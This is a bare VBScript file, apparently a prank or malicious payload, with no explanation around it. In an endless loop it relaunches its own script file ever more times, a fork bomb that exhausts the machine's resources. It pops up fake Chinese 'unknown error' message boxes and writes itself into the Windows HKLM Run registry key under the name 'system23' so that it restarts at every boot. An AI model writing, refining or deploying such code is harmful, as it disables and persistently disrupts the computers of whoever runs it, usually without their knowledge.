Set sh=CreateObject("WScript.Shell")
dim i,s,z,thn
z=array(4,5,16,32,48,64)
i=0
s=1
do
do while i<s
i=i+1
sh.run wscript.scriptfullname
loop
s=s+1
i=0
randomize
wscript.sleep int(rnd()*100)
msgbox "程序发生未知的错误!",z(int((6-1)*rnd()+1)),"Error?@#%^&)TGDZX%#@C889"
thn=wscript.scriptfullname
sh.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system23",thn
loop